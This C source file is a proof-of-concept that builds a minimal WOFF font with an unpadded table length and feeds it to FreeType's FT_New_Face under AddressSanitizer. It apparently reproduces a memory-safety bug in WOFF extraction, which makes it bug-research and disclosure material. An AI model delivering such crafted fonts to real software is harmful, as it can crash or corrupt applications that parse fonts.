/* PoC: crafted WOFF font driving FT_New_Face.
 *
 * The font is a fully valid, in-contract WOFF with a single table whose
 * decompressed length (OrigLength = 30) is not a multiple of 4.  It passes
 * every check in woff_open_font().  The SFNT padding bytes that follow the
 * table data (indices 58, 59) are written by the extraction loop.
 *
 * Build:
 *   gcc -fsanitize=address -g -I/work/include pocs/newbug.c \
 *       objs/.libs/libfreetype.a -lz -lpthread -lm -o /tmp/newbug
 * Run:
 *   /tmp/newbug /tmp/poc.woff
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <ft2build.h>
#include FT_FREETYPE_H

static unsigned char  buf[96];
static int            pos;

static void
w8( unsigned v )
{
  buf[pos++] = (unsigned char)( v & 0xFF );
}

static void
w16( unsigned v )
{
  w8( v >> 8 );
  w8( v );
}

static void
w32( unsigned long v )
{
  w8( (unsigned)( v >> 24 ) );
  w8( (unsigned)( v >> 16 ) );
  w8( (unsigned)( v >>  8 ) );
  w8( (unsigned)( v       ) );
}

int
main( int argc, char** argv )
{
  const char*  path = ( argc > 1 ) ? argv[1] : "/tmp/poc.woff";
  FILE*        f;

  FT_Library   library;
  FT_Face      face;
  FT_Error     error;

  pos = 0;

  /* WOFF header (44 bytes). */
  w32( 0x774F4646UL );   /* signature  'wOFF'                 */
  w32( 0x00010000UL );   /* flavor     (TrueType)             */
  w32( 96 );             /* length     == file size           */
  w16( 1 );              /* num_tables                        */
  w16( 0 );              /* reserved                          */
  w32( 60 );             /* totalSfntSize (12 + 16 + pad(30)) */
  w16( 1 );              /* majorVersion                      */
  w16( 0 );              /* minorVersion                      */
  w32( 0 );              /* metaOffset                        */
  w32( 0 );              /* metaLength                        */
  w32( 0 );              /* metaOrigLength                    */
  w32( 0 );              /* privOffset                        */
  w32( 0 );              /* privLength                        */

  /* Table directory entry (20 bytes). */
  w32( 0x74657374UL );   /* Tag  'test'                       */
  w32( 64 );             /* Offset     (44 + 20)              */
  w32( 30 );             /* CompLength (== OrigLength)        */
  w32( 30 );             /* OrigLength (not a multiple of 4)  */
  w32( 0 );              /* CheckSum                          */

  /* Table data (30 bytes) + 2 padding bytes -> 96 total.     */
  while ( pos < 96 )
    w8( 0 );

  f = fopen( path, "wb" );
  if ( !f )
  {
    perror( "fopen" );
    return 2;
  }
  fwrite( buf, 1, sizeof ( buf ), f );
  fclose( f );

  error = FT_Init_FreeType( &library );
  if ( error )
  {
    fprintf( stderr, "FT_Init_FreeType: 0x%x\n", error );
    return 2;
  }

  error = FT_New_Face( library, path, 0, &face );
  fprintf( stderr, "FT_New_Face returned 0x%x\n", error );

  if ( !error )
    FT_Done_Face( face );
  FT_Done_FreeType( library );

  return 0;
}
